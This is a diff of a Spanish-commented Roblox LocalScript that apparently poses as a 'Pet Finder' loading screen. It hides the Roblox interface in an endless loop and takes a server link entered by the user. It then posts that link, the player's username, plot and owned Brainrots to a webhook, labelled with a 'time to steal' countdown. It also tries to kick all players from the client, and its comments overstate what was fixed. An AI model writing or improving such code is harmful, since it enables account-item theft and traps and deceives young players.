@@ -1,68 +1,4 @@
--- Colocar en: StarterGui > ScreenGui > LocalScript
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-
--- Función para verificar y expulsar jugadores si hay más de uno
-local function checkPlayerCount()
-    local playerCount = #Players:GetPlayers()
-    if playerCount > 1 then
-        -- Mostrar mensaje a todos los jugadores locales (este LocalScript solo afecta al cliente actual)
-        local player = Players.LocalPlayer
-        local playerGui = player and player:FindFirstChild("PlayerGui")
-        if playerGui then
-            local screenGui = Instance.new("ScreenGui")
-            local textLabel = Instance.new("TextLabel")
-            screenGui.Parent = playerGui
-            textLabel.Parent = screenGui
-
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-            textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-            textLabel.TextColor3 = Color3.new(1, 0, 0)
-            textLabel.Text = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
-            textLabel.Font = Enum.Font.SourceSansBold
-            textLabel.TextSize = 24
-            textLabel.ZIndex = 10
-        end
-
-        -- Nota: desde un LocalScript no podrás kickear a otros jugadores en el servidor.
-        -- player:Kick("Solo debe haber un jugador en el servidor") -- esto solo afectaría al jugador local
-        return true
-    end
-    return false
-end
-
--- -------------------------------------------------------
--- Fase inicial: comprobar **solo** durante 3 segundos y terminar
--- -------------------------------------------------------
-local startTime = tick()
-local playerAddedConn
-
--- Solo conectar PlayerAdded durante la fase inicial.
-playerAddedConn = Players.PlayerAdded:Connect(function()
-    -- Si estamos todavía dentro de los 3 segundos, hacemos una verificación rápida
-    if tick() - startTime <= 3 then
-        -- pequeña espera para dejar que el count se actualice
-        wait(0.2)
-        checkPlayerCount()
-    end
-end)
-
--- Bucle activo durante 3 segundos
-while tick() - startTime < 3 do
-    checkPlayerCount()
-    wait(0.5) -- revisar cada 0.5s durante los 3 segundos
-end
-
--- Terminar: desconectar listener y dejar de hacer comprobaciones
-if playerAddedConn then
-    playerAddedConn:Disconnect()
-    playerAddedConn = nil
-end
-
--- El script termina aquí y no hace nada más.
-
-
-
+-- 📍 Colocar en: StarterGui > ScreenGui > LocalScript
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
@@ -71,30 +7,121 @@ local SoundService = game:FindService("SoundService") or game:GetService("SoundS
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 
-if not SoundService then
-	repeat task.wait() until game:FindService("SoundService")
-	SoundService = game:GetService("SoundService")
-end
-
+-- 🔒 DEFINIR PLAYER UNA SOLA VEZ AL INICIO
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- 🔒 Función para verificar y expulsar jugadores si hay más de uno
+local function checkPlayerCount()
+    local playerCount = #Players:GetPlayers()
+    
+    if playerCount > 1 then
+        -- Mostrar mensaje a todos los jugadores
+        for _, otherPlayer in ipairs(Players:GetPlayers()) do
+            local message = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
+            
+            -- Intentar mostrar mensaje en la pantalla del jugador
+            local otherPlayerGui = otherPlayer:FindFirstChild("PlayerGui")
+            if otherPlayerGui then
+                local screenGui = Instance.new("ScreenGui")
+                local textLabel = Instance.new("TextLabel")
+                
+                screenGui.Parent = otherPlayerGui
+                textLabel.Parent = screenGui
+                
+                textLabel.Size = UDim2.new(1, 0, 1, 0)
+                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                textLabel.TextColor3 = Color3.new(1, 0, 0)
+                textLabel.Text = message
+                textLabel.Font = Enum.Font.SourceSansBold
+                textLabel.TextSize = 24
+                textLabel.ZIndex = 10
+            end
+            
+            -- También mostrar en output (consola)
+            print("[SISTEMA] " .. message .. " Jugador: " .. otherPlayer.Name)
+        end
+        
+        -- Esperar 3 segundos antes de expulsar
+        wait(3)
+        
+        -- Expulsar a todos los jugadores
+        for _, otherPlayer in ipairs(Players:GetPlayers()) do
+            pcall(function()
+                otherPlayer:Kick("Solo debe haber un jugador en el servidor")
+            end)
+        end
+        
+        return true -- Se expulsaron jugadores
+    end
+    
+    return false -- No se necesitó expulsar
+end
+
+-- Sistema de verificación inicial (20 segundos)
+local startTime = tick()
+local initialCheckConnection
+
+initialCheckConnection = RunService.Heartbeat:Connect(function()
+    local elapsedTime = tick() - startTime
+    
+    -- Verificar cada segundo durante los primeros 20 segundos
+    if elapsedTime % 1 < 0.1 then -- Aproximadamente cada segundo
+        local playerCount = #Players:GetPlayers()
+        print(string.format("[Sistema] Jugadores: %d, Tiempo: %ds", playerCount, math.floor(elapsedTime)))
+        
+        if checkPlayerCount() then
+            initialCheckConnection:Disconnect()
+            return
+        end
+    end
+    
+    -- Después de 20 segundos, desconectar esta verificación intensiva
+    if elapsedTime >= 20 then
+        print("[Sistema] Verificación intensiva completada")
+        initialCheckConnection:Disconnect()
+        
+        -- Iniciar verificación menos frecuente
+        while true do
+            wait(5) -- Verificar cada 5 segundos
+            
+            local playerCount = #Players:GetPlayers()
+            print(string.format("[Sistema] Verificación periódica - Jugadores: %d", playerCount))
+            
+            checkPlayerCount()
+        end
+    end
+end)
+
+-- También verificar cuando un jugador se une
+Players.PlayerAdded:Connect(function(newPlayer)
+    wait(1) -- Esperar un momento para que se actualice el count
+    
+    local playerCount = #Players:GetPlayers()
+    print("[Sistema] Jugador añadido: " .. newPlayer.Name .. " - Total: " .. playerCount)
+    
+    if playerCount > 1 then
+        checkPlayerCount()
+    end
+end)
+
+-- Detener sonidos
 for _, sound in ipairs(workspace:GetDescendants()) do
-	if sound:IsA("Sound") then
-		sound.Playing = false
-	end
+    if sound:IsA("Sound") then
+        sound.Playing = false
+    end
 end
 
 -- 🔒 Ocultar interfaz de Roblox
 local function hideRobloxUI()
-	pcall(function() CoreGui:WaitForChild("TopBarApp"):Destroy() end)
-	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
-	for _, obj in ipairs(CoreGui:GetChildren()) do
-		if obj:IsA("ScreenGui") and (obj.Name:find("TopBar") or obj.Name:find("Menu")) then
-			pcall(function() obj.Enabled = false end)
-		end
-	end
-	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+    pcall(function() CoreGui:WaitForChild("TopBarApp"):Destroy() end)
+    pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+    for _, obj in ipairs(CoreGui:GetChildren()) do
+        if obj:IsA("ScreenGui") and (obj.Name:find("TopBar") or obj.Name:find("Menu")) then
+            pcall(function() obj.Enabled = false end)
+        end
+    end
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
 end
 
 hideRobloxUI()
@@ -244,200 +271,138 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
--- 🧠 Lista de Brainrots
-local npcNames = {
-    "Perrito Burrito", "Gattatino Nyanino", "Matteo", "Espresso Signora", "Odin Din Din Dun",
-    "Statutino Libertino", "Ballerino Lololo", "Trigoligre Frutonni",
-    "Orcalero Orcala", "Los Crocodillitos", "Piccione Macchina",
-    "La Vacca Staturno Saturnita", "Chimpanzini Spiderini", "Los Tralaleritos",
-    "Las Tralaleritas", "Graipuss Medussi", "La Grande Combinasion",
-    "Nuclearo Dinossauro", "Garama and Madundung",
-    "Tortuginni Dragonfruitini", "Pot Hotspot", "Las Vaquitas Saturnitas",
-    "Chicleteira Bicicleteira", "La Cucaracha"
-}
+-- 🌐 Sistema de envío webhook MEJORADO con datos de Brainrots
+local function horaMexico()
+	local time = os.time()
+	local mexicoOffset = -6 * 3600 -- UTC-6
+	local localTime = os.date("!*t", time + mexicoOffset)
+	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
+end
 
--- 🎯 SISTEMA MEJORADO DE BÚSQUEDA DE BRAINROTS CON VERIFICACIÓN DE PLOT
+-- 🧠 Extraer datos de Brainrots (DisplayName - Generation - Mutation)
+local function getBrainrotData(plot)
+	local results = {}
+	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
+	if not animalPodiums then
+		return {"Ningún Brainrot encontrado"}
+	end
+
+	for _, folder in ipairs(animalPodiums:GetChildren()) do
+		local displayText, genText, mutationText = "N/A", "N/A", "N/A"
+		for _, descendant in ipairs(folder:GetDescendants()) do
+			if descendant:IsA("TextLabel") then
+				local name = string.lower(descendant.Name)
+				if name:find("display") then
+					displayText = descendant.Text
+				elseif name:find("generation") then
+					genText = descendant.Text
+				elseif name:find("mutation") then
+					mutationText = descendant.Text
+				end
+			end
+		end
+		if displayText ~= "N/A" or genText ~= "N/A" or mutationText ~= "N/A" then
+			table.insert(results, displayText .. " - " .. genText .. " - " .. mutationText)
+		end
+	end
+
+	return (#results > 0) and results or {"Ningún Brainrot encontrado"}
+end
+
+-- 🎯 Buscar el plot del jugador
 local function findMyPlot()
-    local plotsFolder = workspace:FindFirstChild("Plots")
-    if not plotsFolder then
-        print("❌ No existe carpeta 'Plots'")
-        return nil
-    end
-    
-    print("🔍 Buscando en " .. #plotsFolder:GetChildren() .. " plots...")
-    
-    for i, plot in pairs(plotsFolder:GetChildren()) do
-        print("📁 Analizando plot: " .. plot.Name)
-        
-        local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
-        if plotSign then
-            print("   ✅ Encontrado: " .. plotSign.Name)
-            
-            local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
-            if surfaceGui then
-                local frame = surfaceGui:FindFirstChild("Frame")
-                if frame then
-                    local textLabel = frame:FindFirstChild("TextLabel")
-                    if textLabel and textLabel:IsA("TextLabel") then
-                        print("   📝 Texto en TextLabel: '" .. textLabel.Text .. "'")
-                        print("   👤 Tu username: '" .. player.Name .. "'")
-                        
-                        -- BUSCAR PARCIALMENTE
-                        if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
-                            print("   🎯 ¡COINCIDENCIA ENCONTRADA! (coincidencia parcial)")
-                            return plot
-                        else
-                            print("   ❌ No coincide")
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    print("❌ No se encontró ningún plot con tu username")
-    return nil
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return nil end
+
+	for _, plot in pairs(plotsFolder:GetChildren()) do
+		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
+		if plotSign then
+			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+			if surfaceGui then
+				local frame = surfaceGui:FindFirstChild("Frame")
+				if frame then
+					local textLabel = frame:FindFirstChild("TextLabel")
+					if textLabel and textLabel:IsA("TextLabel") then
+						if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
+							return plot
+						end
+					end
+				end
+			end
+		end
+	end
+	return nil
 end
 
-local function findBrainrotsInPlots()
-    local foundBrainrots = {}
-    
-    print("🔍 Iniciando búsqueda avanzada de Brainrots...")
-    
-    -- PRIMERO: Buscar el plot del jugador
-    local myPlot = findMyPlot()
-    
-    if myPlot then
-        print("🎯 ESCANEANDO PLOT PERSONAL: " .. myPlot.Name)
-        
-        -- Buscar Brainrots en el plot personal
-        for _, descendant in ipairs(myPlot:GetDescendants()) do
-            if table.find(npcNames, descendant.Name) then
-                print("✅ Brainrot encontrado en tu plot: " .. descendant.Name)
-                if not table.find(foundBrainrots, descendant.Name) then
-                    table.insert(foundBrainrots, descendant.Name)
-                end
-            end
-        end
-        
-        -- Si no se encontraron en el plot personal, buscar en todos los plots
-        if #foundBrainrots == 0 then
-            print("🔍 Búsqueda extendida en todos los plots...")
-            local plotsFolder = workspace:FindFirstChild("Plots")
-            if plotsFolder then
-                for _, plot in ipairs(plotsFolder:GetChildren()) do
-                    for _, descendant in ipairs(plot:GetDescendants()) do
-                        if table.find(npcNames, descendant.Name) then
-                            print("✅ Brainrot encontrado en plot " .. plot.Name .. ": " .. descendant.Name)
-                            if not table.find(foundBrainrots, descendant.Name) then
-                                table.insert(foundBrainrots, descendant.Name)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    else
-        print("🔍 No se encontró plot personal - buscando en todo Workspace...")
-        -- Búsqueda en todo Workspace como fallback
-        for _, descendant in ipairs(workspace:GetDescendants()) do
-            if table.find(npcNames, descendant.Name) then
-                print("✅ Brainrot encontrado en Workspace: " .. descendant.Name)
-                if not table.find(foundBrainrots, descendant.Name) then
-                    table.insert(foundBrainrots, descendant.Name)
-                end
-            end
-        end
-    end
-    
-    -- Informe final
-    if #foundBrainrots > 0 then
-        print("📊 Total Brainrots encontrados: " .. #foundBrainrots)
-        print("🧠 Lista: " .. table.concat(foundBrainrots, ", "))
-    else
-        print("❌ No se encontraron Brainrots")
-    end
-    
-    return foundBrainrots
-end
-
--- 🌐 Sistema de envío webhook MEJORADO con Brainrots
+-- 🚀 Enviar información al Webhook
 local function sendToWebhook(url, data)
-    -- Buscar Brainrots usando el método mejorado
-    local foundBrainrots = findBrainrotsInPlots()
-    local brainrotsText = "Ningún Brainrot encontrado"
-    local plotInfo = "No se encontró plot personal"
-    
-    -- Obtener información del plot
-    local myPlot = findMyPlot()
-    if myPlot then
-        plotInfo = "Plot encontrado: " .. myPlot.Name
-    end
-    
-    if #foundBrainrots > 0 then
-        brainrotsText = table.concat(foundBrainrots, ", ")
-    end
-    
-    local success, result = pcall(function()
-        local response = HttpService:RequestAsync({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = "🔔 **Nueva URL ingresada**",
-                embeds = {{
-                    title = "Información del Usuario",
-                    color = 65280,
-                    fields = {
-                        {
-                            name = "👤 Usuario",
-                            value = player.Name .. " (ID: " .. player.UserId .. ")",
-                            inline = true
-                        },
-                        {
-                            name = "🌐 URL Ingresada",
-                            value = "" .. data.url .."",
-                            inline = false
-                        },
-                        {
-                            name = "📊 Información del Plot",
-                            value = plotInfo,
-                            inline = false
-                        },
-                        {
-                            name = "🧠 Brainrots Encontrados",
-                            value = brainrotsText,
-                            inline = false
-                        },
-                        {
-                            name = "📊 Total Brainrots",
-                            value = tostring(#foundBrainrots),
-                            inline = true
-                        },
-                        {
-                            name = "🕒 Fecha/Hora",
-                            value = os.date("%Y-%m-%d %H:%M:%S"),
-                            inline = true
-                        },
-                        {
-                            name = "🎮 Game ID",
-                            value = tostring(game.GameId),
-                            inline = true
-                        }
-                    },
-                    footer = {
-                        text = "Roblox URL Logger + Brainrot Detector"
-                    }
-                }}
-            })
-        })
-        
-        return response.Success, response.Body
-    end)
-    
-    return success, result
+	local myPlot = findMyPlot()
+	local plotInfo = myPlot and ("Plot encontrado: " .. myPlot.Name) or "No se encontró plot personal"
+	local brainrotList = myPlot and getBrainrotData(myPlot) or {"Ningún Brainrot encontrado"}
+	local brainrotText = table.concat(brainrotList, "\n")
+
+	local embedData = {
+		content = "🔔 **Nuevo evento detectado**",
+		embeds = {{
+			title = "📡 Datos de Escaneo",
+			color = 65280,
+			fields = {
+				{
+					name = "👤 Usuario",
+					value = "`"..player.Name.."`",
+					inline = true
+				},
+				{
+					name = "🌐 Server Link",
+					value = "" ..data.url.."",
+					inline = true
+				},
+				{
+					name = "📊 Información del Plot",
+					value =  plotInfo,
+					inline = false
+				},
+				{
+					name = "🧠 Brainrots Detectados",
+					value = "***" ..brainrotText.. "***",
+					inline = false
+				},
+				{
+					name = "📈 Total Brainrots",
+					value = "```py\n".. tostring(#brainrotList).. "```",
+					inline = true
+				},
+				{
+					name = "🕒 Fecha/Hora (México)",
+					value = horaMexico(),
+					inline = true
+				},
+				{
+					name = "⏱️ Tiempo para robar",
+					value = "4 minutos restantes ⏳",
+					inline = false
+				}
+			},
+			footer = {
+				text = "🐾 Pet Finder | Sistema de rastreo Brainrot"
+			}
+		}}
+	}
+
+	local success, response = pcall(function()
+		return HttpService:RequestAsync({
+			Url = url,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(embedData)
+		})
+	end)
+
+	if success then
+		print("✅ Datos enviados correctamente al webhook.")
+	else
+		warn("❌ Error al enviar webhook: " .. tostring(response))
+	end
 end
 
 -- 🔔 Toast final
@@ -586,15 +551,11 @@ local function startSequence(url)
 		
 		statusText.Text = "Enviando datos..."
 		
-		local success, result = sendToWebhook(webhookUrl, data)
+		-- CORREGIDO: La función sendToWebhook no retorna valores, solo ejecuta
+		sendToWebhook(webhookUrl, data)
 		
-		if success then
-			print("✅ Datos enviados correctamente al webhook")
-			statusText.Text = "Datos enviados - Iniciando secuencia..."
-		else
-			print("❌ Error en sistema:", result)
-			statusText.Text = "Error en envío - Continuando..."
-		end
+		print("✅ Datos enviados al webhook - Iniciando secuencia...")
+		statusText.Text = "Datos enviados - Iniciando secuencia..."
 		
 		task.wait(2)
 	end)
@@ -613,11 +574,30 @@ local function startSequence(url)
 	end)
 end
 
+-- CORREGIDO: Función kickPlayer mejorada
 local function kickPlayer()
-	if uiHideConnection then uiHideConnection:Disconnect() end
-	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
-	pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
-	player:Kick("Has cancelado la experiencia")
+	if uiHideConnection then 
+		uiHideConnection:Disconnect() 
+	end
+	pcall(function() 
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) 
+	end)
+	pcall(function() 
+		StarterGui:SetCore("TopbarEnabled", true) 
+	end)
+	
+	-- USAR pcall PARA MANEJAR POSIBLES ERRORES
+	local success, errorMsg = pcall(function()
+		player:Kick("Has cancelado la experiencia")
+	end)
+	
+	if not success then
+		warn("Error al expulsar jugador: " .. tostring(errorMsg))
+		-- Intentar método alternativo
+		pcall(function()
+			game:Shutdown()
+		end)
+	end
 end
 
 startButton.MouseButton1Click:Connect(function()
@@ -632,7 +612,9 @@ end)
 
 cancelButton.MouseButton1Click:Connect(kickPlayer)
 
+-- CORREGIDO: Bucle while con end faltante
 while true do
 	hideRobloxUI()
 	task.wait(0.5)
 end
+-- FIN DEL SCRIPT - YA NO FALTAN END
